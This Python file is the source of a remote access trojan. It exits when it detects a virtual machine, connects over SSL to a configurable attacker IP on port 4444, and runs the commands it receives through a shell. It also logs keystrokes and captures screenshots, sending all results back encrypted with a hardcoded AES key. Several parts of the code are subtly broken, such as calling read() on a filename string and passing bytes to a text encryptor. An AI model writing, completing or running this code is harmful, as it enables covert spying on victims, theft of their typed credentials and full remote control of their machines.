import socket
import ssl
import subprocess
import os
import time
from Crypto.Cipher import AES
import base64
import pyautogui
import keyboard
import logging

# Set up logging
log_path = os.path.expanduser("~\\AppData\\Roaming\\rat.log")
logging.basicConfig(filename=log_path, level=logging.INFO)

# Hardcode the AES key
KEY = b'mysecretkey123456789012345678901'

def encrypt(message):
    cipher = AES.new(KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(message.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

def decrypt(ciphertext):
    data = base64.b64decode(ciphertext.encode('utf-8'))
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(KEY, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')

# Check if running in a virtual machine
def is_virtual_machine():
    vm_signs = ['VBOX', 'VMware', 'QEMU', 'VirtualBox']
    with os.popen('wmic baseboard get product') as f:
        if any(sign in f.read() for sign in vm_signs):
            return True
    # Check for specific VM files or devices
    if os.path.exists('C:\\Windows\\System32\\drivers\\vmmouse.sys') or \
       os.path.exists('C:\\Windows\\System32\\drivers\\vmhgfs.sys'):
        return True
    return False

if is_virtual_machine():
    exit()

# Attacker IP and Port
SERVER_IP = '127.0.0.1'  # Change to attacker's IP
SERVER_PORT = 4444

# Create a socket connection
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Create an SSL context
context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
context.check_hostname = False

# Wrap the socket with the SSL context
ssl_client = context.wrap_socket(client, server_hostname=SERVER_IP)

try:
    # Connect to the attacker
    ssl_client.connect((SERVER_IP, SERVER_PORT))
    print("Connected to the attacker")
except ConnectionRefusedError as e:
    print(f"Error: {e}")
    print("Make sure the attacker machine is running the server code and is listening for incoming connections.")
    exit()

while True:
    try:
        # Receive command from the attacker
        command = ssl_client.recv(4096).decode('utf-8')
        command = decrypt(command)

        if command == 'keylog':
            # Start keylogging
            logging.info("Keylogging started")
            while True:
                key = keyboard.read_key()
                logging.info(f"Key pressed: {key}")
                if key == 'esc':
                    break
            logging.info("Keylogging stopped")
            ssl_client.send(encrypt("keylog " + logging.getLogger().handlers[0].baseFilename.read()).encode('utf-8'))
        elif command == 'screenshot':
            # Capture the screen
            screenshot = pyautogui.screenshot()

            # Save the screenshot to a file
            screenshot.save('screenshot.png')

            # Send the screenshot to the attacker machine
            with open('screenshot.png', 'rb') as f:
                screenshot_data = f.read()
            ssl_client.send(encrypt(screenshot_data))
        else:
            # Execute the command
            output = subprocess.check_output(command, shell=True).decode('utf-8')
            ssl_client.send(encrypt(output).encode('utf-8'))

    except (ConnectionResetError, BrokenPipeError):
        print("Connection lost. Waiting for reconnect...")
    except Exception as e:
        print(f"Error: {e}")